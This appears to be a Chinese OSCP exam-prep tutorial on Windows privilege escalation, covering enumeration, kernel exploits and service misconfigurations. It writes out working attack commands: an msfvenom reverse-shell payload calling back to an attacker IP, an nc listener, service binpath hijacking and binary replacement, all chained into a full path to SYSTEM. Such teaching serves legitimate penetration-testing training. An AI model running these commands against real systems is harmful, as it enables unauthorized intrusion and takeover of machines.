---
title: OSCP百日备考18｜Windows提权（上）：信息收集+内核漏洞+服务配置错误，从低权用户摸到SYSTEM
url: https://mp.weixin.qq.com/s/Uf7ZeAqNwgLQH5N9QSumBg
source: Doonsec's feed
date: 2026-07-14
fetch_date: 2026-07-15T04:45:21.966862
---

# OSCP百日备考18｜Windows提权（上）：信息收集+内核漏洞+服务配置错误，从低权用户摸到SYSTEM

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Nw0LxfseydX9VpsdacmBTicEUC27NzUY4QoiappMtFghbaibUAPnvO1mYaX5WM1LKlkmxDt95XQ216icx2IibxfofaZmkndeiba2rC6nFGskqJWrA/0?wx_fmt=jpeg)

# OSCP百日备考18｜Windows提权（上）：信息收集+内核漏洞+服务配置错误，从低权用户摸到SYSTEM

泷羽Sec-陌离

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 靶机里最爽的瞬间，是看着命令行弹出 `NT AUTHORITY\SYSTEM`

---

![](https://mmbiz.qpic.cn/mmbiz_jpg/Nw0LxfseydWusPSXyvLCT1VF6AZ7aglCUgE33oOWAqMAATVzSINic5TWTUmUanF3ACGSxgXoibSgicQicLNhVPbduhpG3sByWUSj5jJVPWK8F3g/640?wx_fmt=webp&from=appmsg)

大家好，这里是你们的学长。

上一期（第17期）咱们把 Linux 提权那套"S根目录权限"的活儿聊透了——SUID、sudo、cron、NFS，从普通用户干到 root。后台好多宝子私信我："学长，Windows 机器在 OSCP 考试里也常碰到，它和 Linux 提权到底是不是两码事？我拿到一个 `C:\Users\lowuser>` 的shell，下一步该往哪捅？"

这问题问到点子上了。

说句大实话：Windows 提权和 Linux 提权，**底层逻辑一模一样**——都是"找到以高权限运行的组件，然后篡改它执行的代码或配置"。但 Windows 的攻击面比 Linux 肥得多，因为它多了三样 Linux 没有的东西：**注册表（Registry）、服务（Service）、令牌（Token）**。

这一期我们先打前半场：信息收集、内核漏洞、服务配置错误。后半场（凭据、UAC、令牌魔法）留到第19期，不然篇幅太长你们划不到底。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Nw0LxfseydVBiciaGTKxvwRcrE08lJXalW4zjFdM5IBEmcH4uv45r3EcqWrkSxfk8RlUwAlqJYjR9Pg8odragxs4YYtRicicFPBM0KPqResbzhQ/640?wx_fmt=webp&from=appmsg)

---

## 一、先划生死线：考试能用什么？

OSCP 考试对 Windows 提权工具的态度，和 Linux 一样——**手动枚举脚本随便用，自动化漏洞利用工具别碰**。

| 工具 / 手法 | 考试能用？ | 说明 |
| --- | --- | --- |
| **WinPEAS** | ✅ 能用 | 自动化枚举首选，手动跑不违规，别用带自动利用的模块 |
| **PowerUp** | ✅ 能用 | 专注服务/注册表配置错误，PowerShell 加载 |
| **Seatbelt** | ✅ 能用 | GhostPack 出品，安全向细分枚举，噪声低 |
| **PrivescCheck** | ✅ 能用 | AV 友好，报告清晰，考试环境不容易被杀 |
| **Mimikatz** | ✅ 手动 | 后渗透拿凭据，注意被 AV 拦截，考试允许但需自己绕过 |
| **Metasploit (kiwi)** | ⚠️ 限1台 | 同 MSF 总规则，全卷只能用 1 个目标 |
| **searchsploit + 内核EXP** | ⚠️ 慎选 | 内核漏洞利用**极易崩机器**，考试不推荐首选 |
| **自动化提权脚本（如自动打MS17-010的工具）** | ❌ 禁止 | 类似 SQLMap 的"一键利用"工具，违反规则 |

> ❝
>
> 学长划重点：OSCP 考试里的 Windows 机器，**99% 是配置错误提权**，不是内核漏洞。你拿着 EternalBlue 把靶机打蓝屏了，这题直接 0 分，哭都来不及。内核漏洞那是真实内网渗透的活儿，咱们区分开讲。

---

## 二、说人话：Windows 提权到底在提什么？

一句话本质：**找到一个以 SYSTEM 或 Administrator 身份运行的"程序/服务/安装包"，然后把它本来要执行的代码，换成你的恶意代码。**

Linux 靠的是文件系统权限位（SUID 位、`/etc/shadow` 可写）。Windows 不玩这套，它玩的是：

* **服务（Service）**：很多服务默认以 `NT AUTHORITY\SYSTEM` 跑。如果你能改这个服务"启动哪个 exe"，你就继承了 SYSTEM。
* **注册表（Registry）**：Windows 的"中央配置数据库"。自启动项、安装策略、凭据，全在里面。改写它 = 控制开机行为。
* **令牌（Token）**：Windows 的"临时通行证"。某些服务账户自带 `SeImpersonatePrivilege`，能直接"冒充"SYSTEM——这是第19期令牌魔法的核心。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Nw0LxfseydXZAmvWJGyiaGs35iaRIicnb1FgBBbDpDzkxLlpCT9DVEWpcPJTYXXDXHnxWvgxhVYA0t8sD3icIJsVXia6dv7UJy50DwPLVLxz9nWo/640?wx_fmt=webp&from=appmsg)

记住一句口诀：**Windows 提权 = 找高权组件 + 篡改它的执行内容**。下面所有技术都绕不开这十个字。

---

## 三、信息收集：别瞎打，先摸家底

我当年第一次打 Windows 靶机，拿到 shell 二话不说就上 `whoami`，然后愣了半小时——除了知道自己是 lowuser，啥也不会。后来才懂：**90% 的提权工作发生在枚举阶段**，不是利用阶段。

### 3.1 手动枚举（必会，考试断网也能用）

```
:: 系统版本和补丁——决定你有没有老漏洞可打
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe get Caption,Description,HotFixID,InstalledOn

:: 我是谁、有什么特权——SeImpersonate 在这一步就藏不住
whoami
whoami /priv
whoami /groups

:: 本地管理员有哪些人（横向/提权目标）
net localgroup administrators

:: 跑了什么服务、什么进程
tasklist /v
sc query type= all state= all

:: 计划任务——常以 SYSTEM 跑，下期细讲
schtasks /query /fo LIST /v

:: 网络、共享、防火墙
ipconfig /all
netstat -ano
net share
netsh advfirewall firewall show rule name=all
```

这些命令考试环境断网也能跑，是保底手段。**学长建议：拿到 shell 先手动撸一遍上面这些，再上工具。** 工具会触发 AV，手动不会。

### 3.2 自动化工具对比

| 工具 | 特点 | 考试频率 | 噪声（AV风险） |
| --- | --- | --- | --- |
| **WinPEAS** | 全覆盖，红/黄高亮风险项 | ⭐⭐⭐⭐⭐ | 高（exe 易被杀） |
| **PowerUp** | 专注服务/注册表配置错误 | ⭐⭐⭐⭐ | 中（PS 脚本） |
| **Seatbelt** | 安全向，细分检查（UAC/Defender/凭据） | ⭐⭐⭐ | 低 |
| **JAWS** | 纯 PowerShell，无 exe 落地 | ⭐⭐⭐ | 低 |
| **PrivescCheck** | AV 友好，报告最清晰 | ⭐⭐⭐⭐ | 低 |

```
:: WinPEAS（PEASS-ng 维护，winPEASany.exe 是通杀版）
.\winPEASany.exe quiet

:: PowerUp（PowerSploit 的一部分）
Import-Module .\PowerUp.ps1
Invoke-AllChecks

:: Seatbelt（GhostPack）
.\Seatbelt.exe -group=all

:: PrivescCheck（推荐考试用，AV 不怎么理它）
powershell -ExecutionPolicy Bypass -File .\PrivescCheck.ps1
```

> ❝
>
> 怎么读 WinPEAS 的输出？盯住**红色和黄色**的行。它会在 "Services Information"、"Registry"、"Credentials" 几个区块把能打的漏洞标出来。但记住：**标红 ≠ 一定能打**，一定要手动用 `icacls` 验证目录是否真可写。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Nw0LxfseydWIKibibsyOottosgqBHwWeibFh5muiaYJqgJdsaghmicLUBeghjvr2VkC4WmFBowb4icVNqsPqg4GZ1j9QfxLoSSg2bRVZA2J9FBbX0/640?wx_fmt=webp&from=appmsg)

---

## 四、内核漏洞：真实内网的大杀器，考试里的"高危动作"

先泼盆冷水：下面这些漏洞在**真实渗透/内网老机器**上依然常见，但**OSCP 考试不靠它们**。原因就一个——考试机器是出题人精心配好的，故意留了配置错误给你打，你偏要去跑内核 EXP，崩了机器自己承担。

但作为网安人，你得知道它们长啥样：

| 漏洞 | 影响版本 | 考试能用？ | 实战价值 |
| --- | --- | --- | --- |
| **MS16-032** | Win7/8/10、Server 2008/2012 | ⚠️ 易崩 | 老系统有效 |
| **MS17-010 (EternalBlue)** | Win7/Server 2008 R2 及更早 | ⚠️ MSF限1台 | 内网未打补丁老机器 |
| **CVE-2019-1388** | Win7–Win10（UAC绕过提权） | ❌ 非主路径 | 提权辅助 |
| **CVE-2020-0796 (SMBGhost)** | Win10 1903/1909 | ⚠️ 特定版本 | 特定版本 |
| **PrintNightmare (CVE-2021-34527)** | 全版本（已发补丁） | ❌ 已修复 | 未打补丁内网/域控 |

```
:: MS16-032 利用示例（老系统）
Import-Module .\MS16-032.ps1
Invoke-MS16-032
```

> ❝
>
> 学长提醒：查内核漏洞别只靠记忆，用工具比对补丁级别：
>
> * `Watson`（老牌，C# 写的）
> * `wesng`（Windows Exploit Suggester - Next Generation，Python）
>
> 它们会告诉你"这块系统缺哪个补丁、对应哪个 EXP"。但考试里看到结果，**优先打配置错误，内核 EXP 放最后当兜底**。

---

## 五、服务配置错误：OSCP 考试的提权主战场

这是你考试里最常遇到的提权路径，没有之一。三种花样：

### 5.1 未引用服务路径（Unquoted Service Path）

**原理**：如果服务的二进制路径带空格又没加引号，Windows 启动时会一级级试：

```
路径：C:\Program Files\My App\Service\binary.exe

Windows 会依次尝试：
C:\Program.exe          ← 如果你能写 C:\，就在这儿放恶意 exe
C:\Program Files\My.exe
C:\Program Files\My App\Service\binary.exe  ← 真正的程序
```

只要你能在前面某个目录写文件，就能抢先执行你的恶意程序，而且是以 SYSTEM 身份。

```
:: 第一步：找带空格且没引号的自动启动服务
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v """"

:: 第二步：确认路径里某个目录你能写（比如 C:\Program Files\ 下的子目录）
icacls "C:\Program Files\Vuln App"

:: 第三步：生成恶意 exe（反向shell）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o Program.exe

:: 第四步：放到可写目录，重启服务（或重启机器）
copy Program.exe "C:\Program Files\Vuln App\"
net stop "VulnService" && net start "VulnService"
```

### 5.2 弱服务权限（Weak Service Permissions）

某些服务允许普通用户改它的配置（`SERVICE_CHANGE_CONFIG`）。既然服务以 SYSTEM 跑，你把它的启动路径指到你的 payload，就等于 SYSTEM 帮你运行。

```
:: 用 accesschk（Sysinternals）查哪些服务普通用户能改
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Users" *

:: 如果有 SERVICE_CHANGE_CONFIG 权限，直接改 binpath
sc config VulnService binpath= "C:\temp\revshell.exe"
sc stop VulnService
sc start VulnService
```

> ❝
>
> 学长踩过的坑：改完 `binpath` 记得用 `sc qc VulnService` 确认改成功了，而且**先把原 exe 备份**，考试崩了还能还原。

### 5.3 可写服务二进制 / DLL 劫持

* **可写二进制**：服务 exe 本身你有权限覆盖 → 直接替换。

```
icacls "C:\Path\To\service.exe"   :: 看是否有 (M) 修改权限
copy /Y revshell.exe "C:\Path\To\service.exe"
sc stop VulnService && sc start VulnService
```

* **DLL 劫持**：服务加载 DLL 时如果没指定完整路径，Windows 按固定顺序搜索。用 **Process Monitor**（procmon）过滤 `Result = NAME NOT FOUND` 且 `Path` 以 `.dll` 结尾的加载，找到可写目录里缺失的 DLL，把恶意 DLL 放进去，重启服务即触发。

> ❝
>
> DLL 劫持是实战里特别阴间的手法——杀软常常不报，因为你是"合法程序加载了恶意 DLL"。但考试里出现频率不如前两种，知道原理即可。

---

## 六、一条完整的攻击链（考试里真能复现）

学长把上面串成一条线，你们照着在靶机里跑一遍就懂了：

```
1. 拿到低权 shell：C:\Users\lowuser>
   whoami /priv   → 没啥特权，正常

2. 跑 WinPEAS：
   .\winPEASany.exe quiet
   → 红色提示：某个服务 "VulnApp" 路径未引用，且 C:\Program Files\VulnApp\ 可写

3. 手动验证可写性：
   icacls "C:\Program Files\VulnApp"
   → 确认 Users 组有 (M) 修改权限

4. 生成 payload（注意架构匹配 x64）：
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击机IP LPORT=4444 -f exe -o Program.exe

5. 放到可写目录第一级：
   copy Program.exe "C:\Program Files\VulnApp\"

6. 攻击机开监听：
   nc -lvnp 4444

7. 重启服务（没权限就重启机器，需要 SeShutdownPrivilege）：
   net stop VulnApp && net start VulnApp
   （或 shutdown /r /t 0）

8. 监听收到连接：
   whoami
   → NT AUTHORITY\SYSTEM   🎉
```

这条链没有任何内核漏洞、没有任何自动利用工具，**纯手工 + 配置错误**，正是 OSCP 考试最爱考的节奏。

---

## 七、避坑指南（都是学费换来的）

1. **别一上来就跑内核 EXP**。考试机器靠配置错误，跑内核崩了直接 0 分。先枚举、先打"低垂果实"。
2. **WinPEAS 标红 ≠ 能打**。一定要用 `icacls` 手动验证目录/文件是否真可写，很多红项是误报。
3. **替换服务二进制前先备份原文件**。考试崩了还能 `copy` 回去还原，不备份就只能干瞪眼。
4. \*\*重启服务没权限？看 `whoami /priv` 有没有 `SeShutdownPrivilege`\*\*。有就直接 `shutdown /r /t 0` 重启机器来重启服务。
5. **DLL 劫持别瞎猜**。用 Process Monitor 确认是 `NAME NOT FOUND` 的 DLL、且所在目录你真能写，再放恶意 DLL。
6. **生成 exe 注意架构匹配**。目标是 x64 就生成 x64，x86 就 x86，错了不执行还没报错，排查半天...